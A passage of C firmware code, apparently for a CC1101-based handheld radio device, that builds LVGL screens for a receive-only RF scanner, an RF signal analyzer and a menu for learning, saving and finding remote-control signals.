    lv_obj_clear_flag(rf_scanner_start_button, LV_OBJ_FLAG_HIDDEN);
    lv_label_set_text(lv_obj_get_child(rf_scanner_start_button, 0),
                      show_result_actions ? "SCAN AGAIN" : "START SCAN");
  }
  if (rf_scanner_save_button != NULL) {
    if (show_result_actions) lv_obj_clear_flag(rf_scanner_save_button, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_add_flag(rf_scanner_save_button, LV_OBJ_FLAG_HIDDEN);
  }
  if (rf_scanner_details_button != NULL) {
    if (show_result_actions) lv_obj_clear_flag(rf_scanner_details_button, LV_OBJ_FLAG_HIDDEN);
    else lv_obj_add_flag(rf_scanner_details_button, LV_OBJ_FLAG_HIDDEN);
  }
}


void show_rf_scanner_details(lv_event_t *e) {
  if (rf_scope_screen == NULL) create_rf_scope_screen();
  rf_scope_tab = rf_scope_report_ready ? 2 : 0;
  refresh_rf_scope_tab();
  lv_scr_load(rf_scope_screen);
  set_status("ADVANCED RF DETAILS", COLOR_RF);
}


void open_rf_scanner(lv_event_t *e) {
  if (!cc1101_ready) {
    set_status("CC1101 NOT READY", COLOR_RED);
    return;
  }
  if (rf_capture_active) {
    set_status("RF CAPTURE BUSY", COLOR_RED);
    return;
  }
  if (rf_scanner_screen == NULL) create_rf_scanner_screen();
  rf_live_previous_profile = safe_rf_profile_index();
  rf_live_previous_profile_valid = true;
  rf_scanner_normal_flow = false;
  memset(rf_live_levels, 0, sizeof(rf_live_levels));
  memset(rf_live_peak_levels, 0, sizeof(rf_live_peak_levels));
  memset(rf_live_waterfall_levels, 0, sizeof(rf_live_waterfall_levels));
  rf_live_selected_frequency = 0.0f;
  rf_live_selected_rssi = -140.0f;
  if (rf_live_peak_label != NULL) lv_label_set_text(rf_live_peak_label, "SEARCHING FOR THE STRONGEST SIGNAL");
  if (rf_live_status_label != NULL) lv_label_set_text(rf_live_status_label, "LIVE RECEIVE-ONLY SCAN");
  if (rf_live_analyze_button != NULL) lv_obj_add_state(rf_live_analyze_button, LV_STATE_DISABLED);
  for (uint8_t column = 0; column < RF_LIVE_SCAN_COLUMNS; column++) {
    if (rf_live_spectrum_bars[column] != NULL) {
      lv_obj_set_size(rf_live_spectrum_bars[column], 7, 3);
      lv_obj_set_pos(rf_live_spectrum_bars[column], 10 + column * 9, 79);
    }
    if (rf_live_peak_markers[column] != NULL) {
      lv_obj_set_style_bg_opa(rf_live_peak_markers[column], LV_OPA_TRANSP, LV_PART_MAIN);
    }
  }
  for (uint8_t row = 0; row < RF_LIVE_WATERFALL_ROWS; row++) {
    for (uint8_t column = 0; column < RF_LIVE_SCAN_COLUMNS; column++) {
      if (rf_live_waterfall[row][column] != NULL) {
        lv_obj_set_style_bg_color(rf_live_waterfall[row][column],
                                  lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
        lv_obj_set_style_bg_opa(rf_live_waterfall[row][column], LV_OPA_20, LV_PART_MAIN);
      }
    }
  }
  lv_scr_load(rf_scanner_screen);
  start_live_rf_scanner();
}


void close_rf_scanner(lv_event_t *e) {
  stop_live_rf_scanner();
  if (rf_live_previous_profile_valid) {
    apply_rf_profile(rf_live_previous_profile, false);
    rf_live_previous_profile_valid = false;
  }
  rf_scanner_normal_flow = false;
  lv_scr_load(rf_screen);
  set_status("SYSTEM READY", COLOR_READY);
}


void return_to_rf_scanner(lv_event_t *e) {
  open_rf_scanner(e);
}


void create_rf_scanner_screen() {
  rf_scanner_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(rf_scanner_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_scanner_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(rf_scanner_screen, true);
  create_header(rf_scanner_screen, "RF SCANNER");

  rf_live_status_label = lv_label_create(rf_scanner_screen);
  lv_obj_set_width(rf_live_status_label, 290);
  lv_label_set_text(rf_live_status_label, "LIVE RECEIVE-ONLY SCAN");
  lv_obj_set_style_text_color(rf_live_status_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_live_status_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_live_status_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_live_status_label, LV_ALIGN_TOP_MID, 0, 84);

  rf_live_peak_label = lv_label_create(rf_scanner_screen);
  lv_obj_set_width(rf_live_peak_label, 294);
  lv_label_set_text(rf_live_peak_label, "SEARCHING FOR THE STRONGEST SIGNAL");
  lv_obj_set_style_text_color(rf_live_peak_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_live_peak_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_live_peak_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_live_peak_label, LV_ALIGN_TOP_MID, 0, 105);

  rf_live_spectrum_panel = lv_obj_create(rf_scanner_screen);
  lv_obj_set_size(rf_live_spectrum_panel, 294, 108);
  lv_obj_set_pos(rf_live_spectrum_panel, 13, 126);
  lv_obj_set_style_pad_all(rf_live_spectrum_panel, 0, LV_PART_MAIN);
  lv_obj_set_style_bg_color(rf_live_spectrum_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_live_spectrum_panel, LV_OPA_90, LV_PART_MAIN);
  lv_obj_set_style_border_color(rf_live_spectrum_panel, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(rf_live_spectrum_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(rf_live_spectrum_panel, 8, LV_PART_MAIN);
  lv_obj_clear_flag(rf_live_spectrum_panel, LV_OBJ_FLAG_SCROLLABLE);

  for (uint8_t row = 0; row < 3; row++) {
    lv_obj_t *grid = lv_obj_create(rf_live_spectrum_panel);
    lv_obj_set_size(grid, 280, 1);
    lv_obj_set_pos(grid, 7, 18 + row * 25);
    lv_obj_set_style_bg_color(grid, lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(grid, LV_OPA_20, LV_PART_MAIN);
    lv_obj_set_style_border_width(grid, 0, LV_PART_MAIN);
  }
  for (uint8_t i = 0; i < RF_LIVE_SCAN_COLUMNS; i++) {
    rf_live_spectrum_bars[i] = lv_obj_create(rf_live_spectrum_panel);
    lv_obj_set_size(rf_live_spectrum_bars[i], 7, 3);
    lv_obj_set_pos(rf_live_spectrum_bars[i], 10 + i * 9, 79);
    lv_obj_set_style_bg_color(rf_live_spectrum_bars[i], lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_border_width(rf_live_spectrum_bars[i], 0, LV_PART_MAIN);
    lv_obj_set_style_radius(rf_live_spectrum_bars[i], 1, LV_PART_MAIN);
    lv_obj_add_flag(rf_live_spectrum_bars[i], LV_OBJ_FLAG_CLICKABLE);
    lv_obj_add_event_cb(rf_live_spectrum_bars[i], select_live_rf_frequency,
                        LV_EVENT_CLICKED, (void *)(uintptr_t)i);

    rf_live_peak_markers[i] = lv_obj_create(rf_live_spectrum_panel);
    lv_obj_set_size(rf_live_peak_markers[i], 7, 2);
    lv_obj_set_pos(rf_live_peak_markers[i], 10 + i * 9, 79);
    lv_obj_set_style_bg_color(rf_live_peak_markers[i], lv_color_hex(COLOR_SAVED), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(rf_live_peak_markers[i], LV_OPA_TRANSP, LV_PART_MAIN);
    lv_obj_set_style_border_width(rf_live_peak_markers[i], 0, LV_PART_MAIN);
    lv_obj_clear_flag(rf_live_peak_markers[i], LV_OBJ_FLAG_CLICKABLE);
  }
  rf_live_frequency_label = lv_label_create(rf_live_spectrum_panel);
  lv_obj_set_width(rf_live_frequency_label, 276);
  lv_label_set_text(rf_live_frequency_label, "315 MHz  |  390 MHz  |  433 / 434 MHz");
  lv_obj_set_style_text_color(rf_live_frequency_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_live_frequency_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_live_frequency_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_live_frequency_label, LV_ALIGN_BOTTOM_MID, 0, -2);

  lv_obj_t *waterfall_panel = lv_obj_create(rf_scanner_screen);
  lv_obj_set_size(waterfall_panel, 294, 76);
  lv_obj_set_pos(waterfall_panel, 13, 238);
  lv_obj_set_style_pad_all(waterfall_panel, 2, LV_PART_MAIN);
  lv_obj_set_style_bg_color(waterfall_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(waterfall_panel, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(waterfall_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(waterfall_panel, 8, LV_PART_MAIN);
  lv_obj_clear_flag(waterfall_panel, LV_OBJ_FLAG_SCROLLABLE);
  for (uint8_t row = 0; row < RF_LIVE_WATERFALL_ROWS; row++) {
    for (uint8_t column = 0; column < RF_LIVE_SCAN_COLUMNS; column++) {
      rf_live_waterfall[row][column] = lv_obj_create(waterfall_panel);
      lv_obj_set_size(rf_live_waterfall[row][column], 8, 6);
      lv_obj_set_pos(rf_live_waterfall[row][column], 3 + column * 9, 3 + row * 7);
      lv_obj_set_style_bg_color(rf_live_waterfall[row][column], lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
      lv_obj_set_style_border_width(rf_live_waterfall[row][column], 0, LV_PART_MAIN);
    }
  }

  rf_live_band_button = create_button(rf_scanner_screen, 15, 321, 140, 36,
                                      "ALL BANDS", COLOR_RF, cycle_live_rf_band);
  rf_live_hold_button = create_button(rf_scanner_screen, 165, 321, 140, 36,
                                      "HOLD", COLOR_SETTINGS, toggle_live_rf_hold);
  rf_live_analyze_button = create_button(rf_scanner_screen, 15, 365, 290, 38,
                "ANALYZE STRONGEST SIGNAL", COLOR_GREEN, analyze_live_rf_peak);
  lv_obj_add_state(rf_live_analyze_button, LV_STATE_DISABLED);
  create_button(rf_scanner_screen, 70, 406, 180, 28,
                "BACK TO RF", COLOR_RF, close_rf_scanner);
  create_footer(rf_scanner_screen);
}


void create_rf_scope_screen() {
  rf_scope_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(rf_scope_screen, lv_color_hex(COLOR_BG), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_scope_screen, LV_OPA_COVER, LV_PART_MAIN);
  create_cyber_background(rf_scope_screen, true);
  create_header(rf_scope_screen, "RF ANALYZER");

  rf_scope_state_label = NULL;  // Header status row is the Analyzer state indicator.
  set_rf_scope_state("READY", COLOR_GREEN);

  rf_scope_tab_buttons[0] = create_button(rf_scope_screen, 12, 86, 94, 30,
                "SPECTRUM", COLOR_GREEN, NULL);
  rf_scope_tab_buttons[1] = create_button(rf_scope_screen, 113, 86, 94, 30,
                "WAVEFORM", COLOR_RF, NULL);
  rf_scope_tab_buttons[2] = create_button(rf_scope_screen, 214, 86, 94, 30,
                "DETAILS", COLOR_RF, NULL);
  for (uint8_t i = 0; i < 3; i++) {
    lv_obj_add_event_cb(rf_scope_tab_buttons[i], select_rf_scope_tab,
                        LV_EVENT_CLICKED, (void *)(uintptr_t)i);
    lv_obj_t *label = lv_obj_get_child(rf_scope_tab_buttons[i], 0);
    if (label != NULL) lv_obj_set_style_text_font(label, &lv_font_montserrat_12, LV_PART_MAIN);
  }

  rf_scope_profile_label = lv_label_create(rf_scope_screen);
  lv_obj_set_size(rf_scope_profile_label, 154, 40);
  lv_obj_set_style_text_color(rf_scope_profile_label, lv_color_hex(COLOR_GREEN), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_scope_profile_label, &lv_font_montserrat_16, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_scope_profile_label, LV_TEXT_ALIGN_LEFT, LV_PART_MAIN);
  lv_obj_align(rf_scope_profile_label, LV_ALIGN_TOP_LEFT, 17, 119);

  rf_scope_rssi_label = lv_label_create(rf_scope_screen);
  lv_obj_set_size(rf_scope_rssi_label, 128, 40);
  lv_obj_set_style_text_color(rf_scope_rssi_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_scope_rssi_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_scope_rssi_label, LV_TEXT_ALIGN_RIGHT, LV_PART_MAIN);
  lv_obj_align(rf_scope_rssi_label, LV_ALIGN_TOP_RIGHT, -17, 119);

  rf_scope_panel = lv_obj_create(rf_scope_screen);
  lv_obj_set_size(rf_scope_panel, 294, 92);
  lv_obj_set_pos(rf_scope_panel, 13, 164);
  lv_obj_set_style_pad_all(rf_scope_panel, 0, LV_PART_MAIN);
  lv_obj_set_style_bg_color(rf_scope_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_scope_panel, LV_OPA_90, LV_PART_MAIN);
  lv_obj_set_style_border_color(rf_scope_panel, lv_color_hex(0x344152), LV_PART_MAIN);
  lv_obj_set_style_border_width(rf_scope_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(rf_scope_panel, 10, LV_PART_MAIN);
  lv_obj_set_scrollbar_mode(rf_scope_panel, LV_SCROLLBAR_MODE_OFF);

  // A light grid makes the actual sampled levels easier to read without
  // pretending that the CC1101 is a full SDR spectrum analyzer.
  for (uint8_t row = 0; row < 3; row++) {
    lv_obj_t *grid = lv_obj_create(rf_scope_panel);
    lv_obj_set_size(grid, 270, 1);
    lv_obj_set_pos(grid, 12, 16 + row * 18);
    lv_obj_set_style_bg_color(grid, lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(grid, LV_OPA_30, LV_PART_MAIN);
    lv_obj_set_style_border_width(grid, 0, LV_PART_MAIN);
  }
  for (uint8_t column = 0; column < 4; column++) {
    lv_obj_t *grid = lv_obj_create(rf_scope_panel);
    lv_obj_set_size(grid, 1, 66);
    lv_obj_set_pos(grid, 12 + column * 68, 5);
    lv_obj_set_style_bg_color(grid, lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(grid, LV_OPA_30, LV_PART_MAIN);
    lv_obj_set_style_border_width(grid, 0, LV_PART_MAIN);
  }

  for (uint8_t i = 0; i < RF_SCOPE_BAR_COUNT; i++) {
    rf_scope_bars[i] = lv_obj_create(rf_scope_panel);
    lv_obj_set_size(rf_scope_bars[i], 6, 4);
    lv_obj_set_pos(rf_scope_bars[i], 10 + i * 8, 70);
    lv_obj_set_style_bg_color(rf_scope_bars[i], lv_color_hex(COLOR_RF), LV_PART_MAIN);
    lv_obj_set_style_bg_opa(rf_scope_bars[i], LV_OPA_70, LV_PART_MAIN);
    lv_obj_set_style_border_width(rf_scope_bars[i], 0, LV_PART_MAIN);
    lv_obj_set_style_radius(rf_scope_bars[i], 1, LV_PART_MAIN);
  }

  rf_scope_peak_marker = lv_obj_create(rf_scope_panel);
  lv_obj_set_size(rf_scope_peak_marker, 2, 66);
  lv_obj_set_pos(rf_scope_peak_marker, 12, 5);
  lv_obj_set_style_bg_color(rf_scope_peak_marker, lv_color_hex(COLOR_SETTINGS), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_scope_peak_marker, LV_OPA_80, LV_PART_MAIN);
  lv_obj_set_style_border_width(rf_scope_peak_marker, 0, LV_PART_MAIN);

  rf_scope_axis_label = lv_label_create(rf_scope_panel);
  lv_obj_set_width(rf_scope_axis_label, 270);
  lv_label_set_text(rf_scope_axis_label, "SWEPT CC1101 RSSI / ACTIVITY");
  lv_obj_set_style_text_color(rf_scope_axis_label, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_scope_axis_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_scope_axis_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_scope_axis_label, LV_ALIGN_BOTTOM_MID, 0, -1);

  rf_scope_waveform_message = lv_label_create(rf_scope_panel);
  lv_obj_set_width(rf_scope_waveform_message, 250);
  lv_label_set_text(rf_scope_waveform_message, "NO WAVEFORM YET - SCAN AND CAPTURE A SIGNAL");
  lv_obj_set_style_text_color(rf_scope_waveform_message, lv_color_hex(COLOR_MUTED), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_scope_waveform_message, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_scope_waveform_message, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_scope_waveform_message, LV_ALIGN_CENTER, 0, -8);
  lv_obj_add_flag(rf_scope_waveform_message, LV_OBJ_FLAG_HIDDEN);

  rf_scope_waterfall_panel = lv_obj_create(rf_scope_screen);
  lv_obj_set_size(rf_scope_waterfall_panel, 294, 64);
  lv_obj_set_pos(rf_scope_waterfall_panel, 13, 260);
  lv_obj_set_style_pad_all(rf_scope_waterfall_panel, 2, LV_PART_MAIN);
  lv_obj_set_style_bg_color(rf_scope_waterfall_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_border_color(rf_scope_waterfall_panel, lv_color_hex(COLOR_RF), LV_PART_MAIN);
  lv_obj_set_style_border_width(rf_scope_waterfall_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(rf_scope_waterfall_panel, 8, LV_PART_MAIN);
  lv_obj_clear_flag(rf_scope_waterfall_panel, LV_OBJ_FLAG_SCROLLABLE);
  for (uint8_t row = 0; row < RF_SCOPE_WATERFALL_ROWS; row++) {
    for (uint8_t column = 0; column < RF_SCOPE_BAR_COUNT; column++) {
      rf_scope_waterfall_cells[row][column] = lv_obj_create(rf_scope_waterfall_panel);
      lv_obj_set_size(rf_scope_waterfall_cells[row][column], 8, 9);
      lv_obj_set_pos(rf_scope_waterfall_cells[row][column], 3 + column * 9, 3 + row * 10);
      lv_obj_set_style_bg_color(rf_scope_waterfall_cells[row][column], lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
      lv_obj_set_style_border_width(rf_scope_waterfall_cells[row][column], 0, LV_PART_MAIN);
    }
  }

  rf_scope_caption_label = lv_label_create(rf_scope_screen);
  lv_obj_set_width(rf_scope_caption_label, 290);
  lv_label_set_long_mode(rf_scope_caption_label, LV_LABEL_LONG_WRAP);
  lv_label_set_text(rf_scope_caption_label, "READY - TAP SCAN, THEN HOLD ONE REMOTE BUTTON");
  lv_obj_set_style_text_color(rf_scope_caption_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_scope_caption_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_scope_caption_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(rf_scope_caption_label, LV_ALIGN_TOP_MID, 0, 327);

  rf_scope_details_panel = lv_obj_create(rf_scope_screen);
  lv_obj_set_size(rf_scope_details_panel, 294, 160);
  lv_obj_set_pos(rf_scope_details_panel, 13, 164);
  lv_obj_set_style_pad_all(rf_scope_details_panel, 10, LV_PART_MAIN);
  lv_obj_set_style_bg_color(rf_scope_details_panel, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(rf_scope_details_panel, LV_OPA_90, LV_PART_MAIN);
  lv_obj_set_style_border_color(rf_scope_details_panel, lv_color_hex(0x344152), LV_PART_MAIN);
  lv_obj_set_style_border_width(rf_scope_details_panel, 1, LV_PART_MAIN);
  lv_obj_set_style_radius(rf_scope_details_panel, 10, LV_PART_MAIN);
  lv_obj_set_scrollbar_mode(rf_scope_details_panel, LV_SCROLLBAR_MODE_OFF);
  rf_scope_details_label = lv_label_create(rf_scope_details_panel);
  lv_obj_set_width(rf_scope_details_label, 272);
  lv_label_set_long_mode(rf_scope_details_label, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_color(rf_scope_details_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(rf_scope_details_label, &lv_font_montserrat_12, LV_PART_MAIN);
  lv_obj_set_style_text_align(rf_scope_details_label, LV_TEXT_ALIGN_LEFT, LV_PART_MAIN);
  lv_obj_align(rf_scope_details_label, LV_ALIGN_TOP_LEFT, 0, 0);
  lv_obj_add_flag(rf_scope_details_panel, LV_OBJ_FLAG_HIDDEN);

  rf_scope_scan_button = create_button(rf_scope_screen, 15, 352, 140, 40,
                "SCAN", COLOR_GREEN, start_rf_scan_and_analyze);
  rf_scope_lock_button = create_button(rf_scope_screen, 165, 352, 140, 40,
                "LOCK SIGNAL", COLOR_RF, lock_rf_scope_strongest);
  rf_scope_capture_button = create_button(rf_scope_screen, 165, 352, 140, 40,
                "CAPTURE WAVE", COLOR_RF, open_rf_scope_pulse_capture);
  rf_scope_save_button = create_button(rf_scope_screen, 15, 400, 140, 32,
                "SAVE REPORT", COLOR_SAVED, save_rf_analysis_report);
  lv_obj_add_flag(rf_scope_lock_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(rf_scope_capture_button, LV_OBJ_FLAG_HIDDEN);
  lv_obj_add_flag(rf_scope_save_button, LV_OBJ_FLAG_HIDDEN);
  create_button(rf_scope_screen, 165, 400, 140, 32, "BACK TO RF", COLOR_RF,
                close_rf_scope);
  create_footer(rf_scope_screen);
  refresh_rf_scope_tab();
}

void style_rf_tool_card(lv_obj_t *card) {
  lv_obj_set_style_border_width(card, 1, LV_PART_MAIN);
  lv_obj_set_style_border_color(card, lv_color_hex(COLOR_BORDER), LV_PART_MAIN);
  lv_obj_set_style_radius(card, 12, LV_PART_MAIN);
  lv_obj_set_style_shadow_width(card, 3, LV_PART_MAIN);
  lv_obj_set_style_shadow_color(card, lv_color_hex(COLOR_SHADOW), LV_PART_MAIN);
  lv_obj_set_style_shadow_opa(card, LV_OPA_20, LV_PART_MAIN);
  lv_obj_set_style_bg_color(card, lv_color_hex(COLOR_PANEL2), LV_STATE_PRESSED);
  lv_obj_set_style_border_width(card, 2, LV_STATE_PRESSED);
  lv_obj_set_style_border_color(card, lv_color_hex(COLOR_RF), LV_STATE_PRESSED);
}

void create_rf_screen_legacy() {

  rf_screen =
    lv_obj_create(NULL);


  lv_obj_set_style_bg_color(
    rf_screen,
    lv_color_hex(COLOR_BG),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    rf_screen,
    LV_OPA_COVER,
    LV_PART_MAIN
  );

  create_cyber_background(rf_screen, true);


  create_header(
    rf_screen,
    "RF TOOLS"
  );


  // UNIVERSAL / UNKNOWN

  lv_obj_t *universal =
    lv_btn_create(rf_screen);


  lv_obj_set_size(
    universal,
    280,
    72
  );


  lv_obj_set_pos(
    universal,
    20,
    95
  );


  lv_obj_set_style_pad_all(
    universal,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    universal,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    universal,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    universal,
    2,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    universal,
    lv_color_hex(COLOR_RF),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    universal,
    16,
    LV_PART_MAIN
  );

  style_rf_tool_card(universal);


  lv_obj_add_event_cb(
    universal,
    open_known,
    LV_EVENT_CLICKED,
    NULL
  );


  lv_obj_t *u_title =
    lv_label_create(universal);


  lv_label_set_text(
    u_title,
    "LEARN REMOTE"
  );


  lv_obj_set_style_text_color(
    u_title,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    u_title,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    u_title,
    LV_ALIGN_TOP_MID,
    0,
    10
  );


  lv_obj_t *u_sub =
    lv_label_create(universal);


  lv_label_set_text(
    u_sub,
    "Guided devices or custom button names"
  );


  lv_obj_set_style_text_color(
    u_sub,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    u_sub,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    u_sub,
    LV_ALIGN_BOTTOM_MID,
    0,
    -10
  );


  // SAVED RF REMOTES

  lv_obj_t *known =
    lv_btn_create(rf_screen);


  lv_obj_set_size(
    known,
    280,
    72
  );


  lv_obj_set_pos(
    known,
    20,
    177
  );


  lv_obj_set_style_pad_all(
    known,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    known,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    known,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    known,
    2,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    known,
    lv_color_hex(COLOR_GREEN),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    known,
    16,
    LV_PART_MAIN
  );

  style_rf_tool_card(known);


  lv_obj_add_event_cb(
    known,
    open_saved,
    LV_EVENT_CLICKED,
    NULL
  );


  lv_obj_t *k_title =
    lv_label_create(known);


  lv_label_set_text(
    k_title,
    "SAVED RF REMOTES"
  );


  lv_obj_set_style_text_color(
    k_title,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    k_title,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    k_title,
    LV_ALIGN_TOP_MID,
    0,
    10
  );


  lv_obj_t *k_sub =
    lv_label_create(known);


  lv_label_set_text(
    k_sub,
    "Open and use copied RF remotes"
  );


  lv_obj_set_style_text_color(
    k_sub,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    k_sub,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    k_sub,
    LV_ALIGN_BOTTOM_MID,
    0,
    -10
  );


  // DISCOVER DEVICE

  lv_obj_t *discovery =
    lv_btn_create(rf_screen);


  lv_obj_set_size(
    discovery,
    280,
    72
  );


  lv_obj_set_pos(
    discovery,
    20,
    259
  );


  lv_obj_set_style_pad_all(
    discovery,
    0,
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_color(
    discovery,
    lv_color_hex(COLOR_PANEL),
    LV_PART_MAIN
  );


  lv_obj_set_style_bg_opa(
    discovery,
    LV_OPA_COVER,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_width(
    discovery,
    2,
    LV_PART_MAIN
  );


  lv_obj_set_style_border_color(
    discovery,
    lv_color_hex(COLOR_SETTINGS),
    LV_PART_MAIN
  );


  lv_obj_set_style_radius(
    discovery,
    16,
    LV_PART_MAIN
  );

  style_rf_tool_card(discovery);


  lv_obj_add_event_cb(
    discovery,
    open_discovery,
    LV_EVENT_CLICKED,
    NULL
  );


  lv_obj_t *d_title =
    lv_label_create(discovery);


  lv_label_set_text(
    d_title,
    "FIND DEVICE CONTROLS"
  );


  lv_obj_set_style_text_color(
    d_title,
    lv_color_hex(COLOR_TEXT),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    d_title,
    &lv_font_montserrat_16,
    LV_PART_MAIN
  );


  lv_obj_align(
    d_title,
    LV_ALIGN_TOP_MID,
    0,
    10
  );


  lv_obj_t *d_sub =
    lv_label_create(discovery);


  lv_label_set_text(
    d_sub,
    "Guided testing for a missing remote"
  );


  lv_obj_set_style_text_color(
    d_sub,
    lv_color_hex(COLOR_MUTED),
    LV_PART_MAIN
  );


  lv_obj_set_style_text_font(
    d_sub,
    &lv_font_montserrat_12,
    LV_PART_MAIN
  );


  lv_obj_align(
    d_sub,
    LV_ALIGN_BOTTOM_MID,
    0,
    -10
  );


  create_button(
    rf_screen,
    15,
    342,
    137,
    34,
    "RF PROFILE",
    COLOR_RF,
    open_rf_profile
  );

  create_button(
    rf_screen,
    168,
    342,
    137,
    34,
    "RF ANALYSIS",
    COLOR_RF,
    open_rf_scope
  );

  create_button(
    rf_screen,
    80,
    386,
    160,
    32,
    "<  HOME",
    COLOR_RF,
    go_home
  );


  create_footer(
    rf_screen
  );
}


lv_obj_t *create_rf_menu_tile(int x, int y, int width, int height,
                              const char *title, const char *subtitle,
                              uint32_t color, lv_event_cb_t callback) {
  lv_obj_t *card = lv_btn_create(rf_screen);
  lv_obj_set_size(card, width, height);
  lv_obj_set_pos(card, x, y);
  lv_obj_set_style_pad_all(card, 0, LV_PART_MAIN);
  lv_obj_set_style_bg_color(card, lv_color_hex(COLOR_PANEL), LV_PART_MAIN);
  lv_obj_set_style_bg_opa(card, LV_OPA_COVER, LV_PART_MAIN);
  lv_obj_set_style_border_color(card, lv_color_hex(color), LV_PART_MAIN);
  style_rf_tool_card(card);
  lv_obj_add_event_cb(card, callback, LV_EVENT_CLICKED, NULL);
  lv_obj_t *title_label = lv_label_create(card);
  lv_label_set_text(title_label, title);
  lv_obj_set_width(title_label, width - 20);
  lv_label_set_long_mode(title_label, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_color(title_label, lv_color_hex(COLOR_TEXT), LV_PART_MAIN);
  lv_obj_set_style_text_font(title_label, &lv_font_montserrat_14, LV_PART_MAIN);
  lv_obj_set_style_text_align(title_label, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
  lv_obj_align(title_label, LV_ALIGN_TOP_MID, 0, height >= 90 ? 18 : 10);
  lv_obj_t *subtitle_label = lv_label_create(card);
